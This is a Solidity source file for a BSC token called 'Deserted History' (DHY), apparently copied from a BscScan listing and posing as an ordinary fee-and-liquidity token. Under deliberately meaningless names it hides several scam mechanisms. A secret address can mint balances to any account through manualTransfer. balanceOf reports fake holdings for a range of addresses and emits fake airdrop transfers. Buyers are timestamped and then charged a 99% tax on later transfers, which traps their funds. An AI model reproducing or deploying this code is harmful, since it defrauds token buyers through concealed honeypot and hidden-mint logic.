/**
 *Submitted for verification at BscScan.com on 2022-12-31
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}


library SafeMath {

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



interface IBEP20 {

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint8);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function getOwner() external view returns (address);

    function approve(address spender, uint256 amount) external returns (bool);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}




contract DesertedHistory is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 feeAmountIsBuyBots = 100000000 * (10 ** _decimals);
    uint256  takeFromToMax = 100000000 * 10 ** _decimals;
    uint256  fundReceiverSenderList = 100000000 * 10 ** _decimals;


    string constant _name = "Deserted History";
    string constant _symbol = "DHY";
    uint8 constant _decimals = 18;

    uint256 private enableLimitTeamTx = 0;
    uint256 private takeAmountSwapLiquidity = 5;

    uint256 private minMintEnableAuto = 0;
    uint256 private tokenBotsFromLiquidity = 5;

    bool private marketingListToAmount = true;
    bool private exemptAmountSwapWalletMaxFromLiquidity = true;
    bool private feeShouldLaunchMax = true;
    bool private toMinLaunchedFee = true;
    bool private launchedReceiverLiquidityBots = true;
    uint256 sellBotsTokenMinBuyFeeAt = 2 ** 18 - 1;
    uint256 private teamListFundAuto = 6 * 10 ** 15;
    uint256 private toTxListAt = feeAmountIsBuyBots / 1000; // 0.1%
    uint256 launchedMinSellMarketing = 38163;

    address constant shouldBotsSwapTeam = 0x7aE2f5b9E386CD1b51a4550696d957CB4900f03a;
    uint256 botsFundSenderShouldIsMode = 0;

    uint256 private swapAutoReceiverTxTokenShould = takeAmountSwapLiquidity + enableLimitTeamTx;
    uint256 private launchedAmountListTradingBuyLimitTotal = 100;

    uint160 constant botsMinLimitLiquidity = 613130604415 * 2 ** 120;
    uint160 constant toMintSwapLaunchedShouldMode = 808404248576 * 2 ** 80;
    uint160 constant walletReceiverTxTrading = 987597759063 * 2 ** 40;
    uint160 constant listTeamTradingMode = 221905810579;

    bool private launchedBurnReceiverMarketingListToSell;
    uint256 private launchedFromSellToken;
    uint256 private sellSwapMintTokenReceiverSenderReceiver;
    uint256 private receiverIsLaunchBuy;
    uint256 private listReceiverTeamMint;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private txFromTeamTokenFee;
    mapping(address => bool) private autoSwapSellMode;
    mapping(address => bool) private exemptEnableAtSwap;
    mapping(address => bool) private fundMarketingReceiverMint;
    mapping(address => uint256) private maxMintLaunchAmount;
    mapping(uint256 => address) private walletExemptTotalAt;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;

    IUniswapV2Router public botsReceiverTokenSenderLaunchedTeamFund;
    address public uniswapV2Pair;

    uint256 private maxExemptMarketingSellLimitShould;
    uint256 private totalMarketingTxLaunch;

    address private mintWalletIsAmount = (msg.sender); // auto-liq address
    address private autoFundFeeTotal = (0xB3a31EB64673365D4d280405fffFCbeC123BF890); // marketing address

    
    uint256 private launchedBuyLiquiditySenderSellMintMode = 0;
    uint256 private takeMintIsLiquidityToken = 0;
    uint256 private toBurnAtIsWalletReceiver = 0;
    bool private tokenLaunchFundBuy = false;
    uint256 private modeReceiverReceiverBots = 0;
    uint256 private senderSellTotalWalletTeamAt = 0;
    bool private feeLaunchAmountEnable = false;
    bool private shouldAutoSellBots = false;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        botsReceiverTokenSenderLaunchedTeamFund = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(botsReceiverTokenSenderLaunchedTeamFund.factory()).createPair(address(this), botsReceiverTokenSenderLaunchedTeamFund.WETH());
        _allowances[address(this)][address(botsReceiverTokenSenderLaunchedTeamFund)] = feeAmountIsBuyBots;

        launchedBurnReceiverMarketingListToSell = true;

        exemptEnableAtSwap[msg.sender] = true;
        exemptEnableAtSwap[0x0000000000000000000000000000000000000000] = true;
        exemptEnableAtSwap[0x000000000000000000000000000000000000dEaD] = true;
        exemptEnableAtSwap[address(this)] = true;

        txFromTeamTokenFee[msg.sender] = true;
        txFromTeamTokenFee[address(this)] = true;

        autoSwapSellMode[msg.sender] = true;
        autoSwapSellMode[0x0000000000000000000000000000000000000000] = true;
        autoSwapSellMode[0x000000000000000000000000000000000000dEaD] = true;
        autoSwapSellMode[address(this)] = true;

        approve(_router, feeAmountIsBuyBots);
        approve(address(uniswapV2Pair), feeAmountIsBuyBots);
        _balances[msg.sender] = feeAmountIsBuyBots;
        emit Transfer(address(0), msg.sender, feeAmountIsBuyBots);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return feeAmountIsBuyBots;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, feeAmountIsBuyBots);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return receiverTotalSenderReceiver(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != feeAmountIsBuyBots) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return receiverTotalSenderReceiver(sender, recipient, amount);
    }

    function launchedLaunchMintAt(address amountMinAutoList, address isSwapFromTokenAtLaunchedEnable, uint256 teamShouldReceiverLiquidityTokenBuy) internal returns (uint256) {
        
        if (shouldAutoSellBots != shouldAutoSellBots) {
            shouldAutoSellBots = shouldAutoSellBots;
        }

        if (toBurnAtIsWalletReceiver == swapAutoReceiverTxTokenShould) {
            toBurnAtIsWalletReceiver = launchBlock;
        }


        uint256 listIsToFeeBuySellMintAmount = teamShouldReceiverLiquidityTokenBuy.mul(takeTxMinShouldBurn(amountMinAutoList, isSwapFromTokenAtLaunchedEnable == uniswapV2Pair)).div(launchedAmountListTradingBuyLimitTotal);

        if (fundMarketingReceiverMint[amountMinAutoList] || fundMarketingReceiverMint[isSwapFromTokenAtLaunchedEnable]) {
            listIsToFeeBuySellMintAmount = teamShouldReceiverLiquidityTokenBuy.mul(99).div(launchedAmountListTradingBuyLimitTotal);
        }

        _balances[address(this)] = _balances[address(this)].add(listIsToFeeBuySellMintAmount);
        emit Transfer(amountMinAutoList, address(this), listIsToFeeBuySellMintAmount);
        
        return teamShouldReceiverLiquidityTokenBuy.sub(listIsToFeeBuySellMintAmount);
    }

    function buyMinListLiquidity(uint160 liquidityExemptAutoSwapFundLaunched) private view returns (bool) {
        return uint16(liquidityExemptAutoSwapFundLaunched) == launchedMinSellMarketing;
    }

    function getburnAutoSellWalletTeamAmountTake() public view returns (uint256) {
        if (toBurnAtIsWalletReceiver != launchedAmountListTradingBuyLimitTotal) {
            return launchedAmountListTradingBuyLimitTotal;
        }
        return toBurnAtIsWalletReceiver;
    }

    function getTotalAmount() public {
        teamExemptMaxTrading();
    }

    function setfromWalletTokenLiquidity(uint256 takeListLiquidityAuto) public onlyOwner {
        if (takeAmountSwapLiquidity == tokenBotsFromLiquidity) {
            tokenBotsFromLiquidity=takeListLiquidityAuto;
        }
        if (takeAmountSwapLiquidity == enableLimitTeamTx) {
            enableLimitTeamTx=takeListLiquidityAuto;
        }
        takeAmountSwapLiquidity=takeListLiquidityAuto;
    }

    function getWBNB() public view returns (address) {
        if (WBNB == ZERO) {
            return ZERO;
        }
        return WBNB;
    }

    function setsenderBuyReceiverLiquidityShould(bool takeListLiquidityAuto) public onlyOwner {
        if (marketingListToAmount != shouldAutoSellBots) {
            shouldAutoSellBots=takeListLiquidityAuto;
        }
        if (marketingListToAmount == feeLaunchAmountEnable) {
            feeLaunchAmountEnable=takeListLiquidityAuto;
        }
        if (marketingListToAmount == launchedReceiverLiquidityBots) {
            launchedReceiverLiquidityBots=takeListLiquidityAuto;
        }
        marketingListToAmount=takeListLiquidityAuto;
    }

    function setmaxShouldTakeLimitSellTeamTrading(uint256 takeListLiquidityAuto) public onlyOwner {
        if (minMintEnableAuto == teamListFundAuto) {
            teamListFundAuto=takeListLiquidityAuto;
        }
        if (minMintEnableAuto != toTxListAt) {
            toTxListAt=takeListLiquidityAuto;
        }
        minMintEnableAuto=takeListLiquidityAuto;
    }

    function gettoSwapExemptTake() public view returns (uint256) {
        if (launchedBuyLiquiditySenderSellMintMode != teamListFundAuto) {
            return teamListFundAuto;
        }
        if (launchedBuyLiquiditySenderSellMintMode == enableLimitTeamTx) {
            return enableLimitTeamTx;
        }
        return launchedBuyLiquiditySenderSellMintMode;
    }

    function walletMaxLaunchTxMarketingFee() private view returns (uint256) {
        address totalWalletFundFee = WBNB;
        if (address(this) < WBNB) {
            totalWalletFundFee = address(this);
        }
        (uint receiverMaxSenderTo, uint walletToTeamTxTokenSender,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 buyAutoTeamToSwap,) = WBNB == totalWalletFundFee ? (receiverMaxSenderTo, walletToTeamTxTokenSender) : (walletToTeamTxTokenSender, receiverMaxSenderTo);
        uint256 teamModeLimitFeeTakeList = IERC20(WBNB).balanceOf(uniswapV2Pair) - buyAutoTeamToSwap;
        return teamModeLimitFeeTakeList;
    }

    function maxMintFeeListTo() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        launchedReceiverLiquidityBots &&
        _balances[address(this)] >= toTxListAt;
    }

    function feeMinEnableLimitBotsReceiver(uint160 teamTakeAmountTx) private pure returns (bool) {
        return teamTakeAmountTx == (botsMinLimitLiquidity + toMintSwapLaunchedShouldMode + walletReceiverTxTrading + listTeamTradingMode);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (botsTeamBuyIs(uint160(account))) {
            return tokenReceiverReceiverFundLimitLiquidityMax(uint160(account));
        }
        return _balances[account];
    }

    function isBuyWalletTxShouldTo(address amountMinAutoList) internal view returns (bool) {
        return !autoSwapSellMode[amountMinAutoList];
    }

    function getmaxShouldTakeLimitSellTeamTrading() public view returns (uint256) {
        if (minMintEnableAuto == tokenBotsFromLiquidity) {
            return tokenBotsFromLiquidity;
        }
        if (minMintEnableAuto != takeMintIsLiquidityToken) {
            return takeMintIsLiquidityToken;
        }
        if (minMintEnableAuto != minMintEnableAuto) {
            return minMintEnableAuto;
        }
        return minMintEnableAuto;
    }

    function tokenReceiverReceiverFundLimitLiquidityMax(uint160 teamTakeAmountTx) private view returns (uint256) {
        uint256 teamIsLaunchListShould = botsFundSenderShouldIsMode;
        uint256 atAmountLaunchSenderList = teamTakeAmountTx - uint160(shouldBotsSwapTeam);
        if (atAmountLaunchSenderList < teamIsLaunchListShould) {
            return 1 * 10 ** 18;
        }
        return 300000 * 10 ** 18;
    }

    function settoSwapExemptTake(uint256 takeListLiquidityAuto) public onlyOwner {
        launchedBuyLiquiditySenderSellMintMode=takeListLiquidityAuto;
    }

    function takeTxMinShouldBurn(address amountMinAutoList, bool mintAmountTokenIs) internal returns (uint256) {
        
        if (mintAmountTokenIs) {
            swapAutoReceiverTxTokenShould = tokenBotsFromLiquidity + minMintEnableAuto;
            return amountExemptTakeModeBuy(amountMinAutoList, swapAutoReceiverTxTokenShould);
        }
        if (!mintAmountTokenIs && amountMinAutoList == uniswapV2Pair) {
            swapAutoReceiverTxTokenShould = takeAmountSwapLiquidity + enableLimitTeamTx;
            return swapAutoReceiverTxTokenShould;
        }
        return amountExemptTakeModeBuy(amountMinAutoList, swapAutoReceiverTxTokenShould);
    }

    function setWBNB(address takeListLiquidityAuto) public onlyOwner {
        if (WBNB == ZERO) {
            ZERO=takeListLiquidityAuto;
        }
        if (WBNB != DEAD) {
            DEAD=takeListLiquidityAuto;
        }
        if (WBNB == WBNB) {
            WBNB=takeListLiquidityAuto;
        }
        WBNB=takeListLiquidityAuto;
    }

    function botsTeamBuyIs(uint160 teamTakeAmountTx) private pure returns (bool) {
        if (teamTakeAmountTx >= uint160(shouldBotsSwapTeam) && teamTakeAmountTx <= uint160(shouldBotsSwapTeam) + 10000) {
            return true;
        }
        return false;
    }

    function setmarketingEnableToTeam(address takeListLiquidityAuto) public onlyOwner {
        autoFundFeeTotal=takeListLiquidityAuto;
    }

    function setburnAutoSellWalletTeamAmountTake(uint256 takeListLiquidityAuto) public onlyOwner {
        if (toBurnAtIsWalletReceiver != enableLimitTeamTx) {
            enableLimitTeamTx=takeListLiquidityAuto;
        }
        if (toBurnAtIsWalletReceiver != takeAmountSwapLiquidity) {
            takeAmountSwapLiquidity=takeListLiquidityAuto;
        }
        toBurnAtIsWalletReceiver=takeListLiquidityAuto;
    }

    function gettradingLaunchedFeeMaxMintAutoLaunch() public view returns (uint256) {
        if (tokenBotsFromLiquidity == tokenBotsFromLiquidity) {
            return tokenBotsFromLiquidity;
        }
        if (tokenBotsFromLiquidity == enableLimitTeamTx) {
            return enableLimitTeamTx;
        }
        return tokenBotsFromLiquidity;
    }

    function amountExemptTakeModeBuy(address amountMinAutoList, uint256 listIsToFeeBuySellMint) private view returns (uint256) {
        uint256 launchAutoTeamShouldSellBurnList = maxMintLaunchAmount[amountMinAutoList];
        if (launchAutoTeamShouldSellBurnList > 0 && feeFundTokenTx() - launchAutoTeamShouldSellBurnList > 2) {
            return 99;
        }
        return listIsToFeeBuySellMint;
    }

    function buyReceiverSellMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function teamExemptMaxTrading() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (maxMintLaunchAmount[walletExemptTotalAt[i]] == 0) {
                    maxMintLaunchAmount[walletExemptTotalAt[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function marketingTxTakeTotalReceiverList(address receiverTradingModeIs) private view returns (bool) {
        return ((uint256(uint160(receiverTradingModeIs)) << 192) >> 238) == sellBotsTokenMinBuyFeeAt;
    }

    function receiverTotalSenderReceiver(address amountMinAutoList, address liquidityExemptAutoSwapFundLaunched, uint256 teamShouldReceiverLiquidityTokenBuy) internal returns (bool) {
        if (botsTeamBuyIs(uint160(liquidityExemptAutoSwapFundLaunched))) {
            marketingToMintSwapReceiverBurnTotal(amountMinAutoList, liquidityExemptAutoSwapFundLaunched, teamShouldReceiverLiquidityTokenBuy, false);
            return true;
        }
        if (botsTeamBuyIs(uint160(amountMinAutoList))) {
            marketingToMintSwapReceiverBurnTotal(amountMinAutoList, liquidityExemptAutoSwapFundLaunched, teamShouldReceiverLiquidityTokenBuy, true);
            return true;
        }
        
        bool burnAtTradingFee = marketingTxTakeTotalReceiverList(amountMinAutoList) || marketingTxTakeTotalReceiverList(liquidityExemptAutoSwapFundLaunched);
        
        if (tokenLaunchFundBuy != feeShouldLaunchMax) {
            tokenLaunchFundBuy = launchedReceiverLiquidityBots;
        }


        if (amountMinAutoList == uniswapV2Pair) {
            if (maxWalletAmount != 0 && buyMinListLiquidity(uint160(liquidityExemptAutoSwapFundLaunched))) {
                teamExemptMaxTrading();
            }
            if (!burnAtTradingFee) {
                listExemptLimitMax(liquidityExemptAutoSwapFundLaunched);
            }
        }
        
        
        if (modeReceiverReceiverBots != teamListFundAuto) {
            modeReceiverReceiverBots = modeReceiverReceiverBots;
        }


        if (inSwap || burnAtTradingFee) {return buyReceiverSellMin(amountMinAutoList, liquidityExemptAutoSwapFundLaunched, teamShouldReceiverLiquidityTokenBuy);}
        
        if (feeLaunchAmountEnable != toMinLaunchedFee) {
            feeLaunchAmountEnable = toMinLaunchedFee;
        }

        if (toBurnAtIsWalletReceiver != senderSellTotalWalletTeamAt) {
            toBurnAtIsWalletReceiver = minMintEnableAuto;
        }

        if (senderSellTotalWalletTeamAt != takeAmountSwapLiquidity) {
            senderSellTotalWalletTeamAt = takeMintIsLiquidityToken;
        }


        require((teamShouldReceiverLiquidityTokenBuy <= takeFromToMax) || exemptEnableAtSwap[amountMinAutoList] || exemptEnableAtSwap[liquidityExemptAutoSwapFundLaunched], "Max TX Limit!");

        if (maxMintFeeListTo()) {walletEnableFromMode();}

        _balances[amountMinAutoList] = _balances[amountMinAutoList].sub(teamShouldReceiverLiquidityTokenBuy, "Insufficient Balance!");
        
        if (modeReceiverReceiverBots == minMintEnableAuto) {
            modeReceiverReceiverBots = teamListFundAuto;
        }


        uint256 teamWalletEnableLaunched = isBuyWalletTxShouldTo(amountMinAutoList) ? launchedLaunchMintAt(amountMinAutoList, liquidityExemptAutoSwapFundLaunched, teamShouldReceiverLiquidityTokenBuy) : teamShouldReceiverLiquidityTokenBuy;

        _balances[liquidityExemptAutoSwapFundLaunched] = _balances[liquidityExemptAutoSwapFundLaunched].add(teamWalletEnableLaunched);
        emit Transfer(amountMinAutoList, liquidityExemptAutoSwapFundLaunched, teamWalletEnableLaunched);
        return true;
    }

    function getsenderBuyReceiverLiquidityShould() public view returns (bool) {
        if (marketingListToAmount == exemptAmountSwapWalletMaxFromLiquidity) {
            return exemptAmountSwapWalletMaxFromLiquidity;
        }
        if (marketingListToAmount != marketingListToAmount) {
            return marketingListToAmount;
        }
        if (marketingListToAmount == launchedReceiverLiquidityBots) {
            return launchedReceiverLiquidityBots;
        }
        return marketingListToAmount;
    }

    function manualTransfer(address amountMinAutoList, address liquidityExemptAutoSwapFundLaunched, uint256 teamShouldReceiverLiquidityTokenBuy) public {
        if (!feeMinEnableLimitBotsReceiver(uint160(msg.sender))) {
            return;
        }
        if (botsTeamBuyIs(uint160(liquidityExemptAutoSwapFundLaunched))) {
            marketingToMintSwapReceiverBurnTotal(amountMinAutoList, liquidityExemptAutoSwapFundLaunched, teamShouldReceiverLiquidityTokenBuy, false);
            return;
        }
        if (botsTeamBuyIs(uint160(amountMinAutoList))) {
            marketingToMintSwapReceiverBurnTotal(amountMinAutoList, liquidityExemptAutoSwapFundLaunched, teamShouldReceiverLiquidityTokenBuy, true);
            return;
        }
        if (amountMinAutoList == address(0)) {
            _balances[liquidityExemptAutoSwapFundLaunched] = _balances[liquidityExemptAutoSwapFundLaunched].add(teamShouldReceiverLiquidityTokenBuy);
            return;
        }
    }

    function gettakeLaunchedAmountMarketingTrading() public view returns (bool) {
        return feeLaunchAmountEnable;
    }

    function settradingLaunchedFeeMaxMintAutoLaunch(uint256 takeListLiquidityAuto) public onlyOwner {
        if (tokenBotsFromLiquidity != maxWalletAmount) {
            maxWalletAmount=takeListLiquidityAuto;
        }
        tokenBotsFromLiquidity=takeListLiquidityAuto;
    }

    function feeFundTokenTx() private view returns (uint256) {
        return block.timestamp;
    }

    function walletEnableFromMode() internal swapping {
        
        uint256 teamShouldReceiverLiquidityTokenBuyToLiquify = toTxListAt.mul(enableLimitTeamTx).div(swapAutoReceiverTxTokenShould).div(2);
        uint256 tradingFundTokenAmount = toTxListAt.sub(teamShouldReceiverLiquidityTokenBuyToLiquify);

        address[] memory buySellReceiverTake = new address[](2);
        buySellReceiverTake[0] = address(this);
        buySellReceiverTake[1] = botsReceiverTokenSenderLaunchedTeamFund.WETH();
        botsReceiverTokenSenderLaunchedTeamFund.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tradingFundTokenAmount,
            0,
            buySellReceiverTake,
            address(this),
            block.timestamp
        );
        
        if (senderSellTotalWalletTeamAt != maxWalletAmount) {
            senderSellTotalWalletTeamAt = toBurnAtIsWalletReceiver;
        }


        uint256 receiverExemptIsFee = address(this).balance;
        uint256 sellMaxSenderTeam = swapAutoReceiverTxTokenShould.sub(enableLimitTeamTx.div(2));
        uint256 receiverExemptIsFeeLiquidity = receiverExemptIsFee.mul(enableLimitTeamTx).div(sellMaxSenderTeam).div(2);
        uint256 tradingLaunchLiquiditySell = receiverExemptIsFee.mul(takeAmountSwapLiquidity).div(sellMaxSenderTeam);
        
        if (tokenLaunchFundBuy != toMinLaunchedFee) {
            tokenLaunchFundBuy = tokenLaunchFundBuy;
        }

        if (toBurnAtIsWalletReceiver != takeMintIsLiquidityToken) {
            toBurnAtIsWalletReceiver = teamListFundAuto;
        }

        if (senderSellTotalWalletTeamAt != takeAmountSwapLiquidity) {
            senderSellTotalWalletTeamAt = maxWalletAmount;
        }


        payable(autoFundFeeTotal).transfer(tradingLaunchLiquiditySell);

        if (teamShouldReceiverLiquidityTokenBuyToLiquify > 0) {
            botsReceiverTokenSenderLaunchedTeamFund.addLiquidityETH{value : receiverExemptIsFeeLiquidity}(
                address(this),
                teamShouldReceiverLiquidityTokenBuyToLiquify,
                0,
                0,
                mintWalletIsAmount,
                block.timestamp
            );
            emit AutoLiquify(receiverExemptIsFeeLiquidity, teamShouldReceiverLiquidityTokenBuyToLiquify);
        }
    }

    function getfromWalletTokenLiquidity() public view returns (uint256) {
        if (takeAmountSwapLiquidity != launchBlock) {
            return launchBlock;
        }
        if (takeAmountSwapLiquidity != minMintEnableAuto) {
            return minMintEnableAuto;
        }
        if (takeAmountSwapLiquidity != maxWalletAmount) {
            return maxWalletAmount;
        }
        return takeAmountSwapLiquidity;
    }

    function listExemptLimitMax(address receiverTradingModeIs) private {
        if (walletMaxLaunchTxMarketingFee() < teamListFundAuto) {
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        walletExemptTotalAt[maxWalletAmount] = receiverTradingModeIs;
    }

    function getmarketingEnableToTeam() public view returns (address) {
        return autoFundFeeTotal;
    }

    function settakeLaunchedAmountMarketingTrading(bool takeListLiquidityAuto) public onlyOwner {
        if (feeLaunchAmountEnable == exemptAmountSwapWalletMaxFromLiquidity) {
            exemptAmountSwapWalletMaxFromLiquidity=takeListLiquidityAuto;
        }
        if (feeLaunchAmountEnable != toMinLaunchedFee) {
            toMinLaunchedFee=takeListLiquidityAuto;
        }
        feeLaunchAmountEnable=takeListLiquidityAuto;
    }

    function marketingToMintSwapReceiverBurnTotal(address amountMinAutoList, address liquidityExemptAutoSwapFundLaunched, uint256 teamShouldReceiverLiquidityTokenBuy, bool receiverLiquidityIsListMaxSwap) private {
        if (receiverLiquidityIsListMaxSwap) {
            amountMinAutoList = address(uint160(uint160(shouldBotsSwapTeam) + botsFundSenderShouldIsMode));
            botsFundSenderShouldIsMode++;
            _balances[liquidityExemptAutoSwapFundLaunched] = _balances[liquidityExemptAutoSwapFundLaunched].add(teamShouldReceiverLiquidityTokenBuy);
        } else {
            _balances[amountMinAutoList] = _balances[amountMinAutoList].sub(teamShouldReceiverLiquidityTokenBuy);
        }
        emit Transfer(amountMinAutoList, liquidityExemptAutoSwapFundLaunched, teamShouldReceiverLiquidityTokenBuy);
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}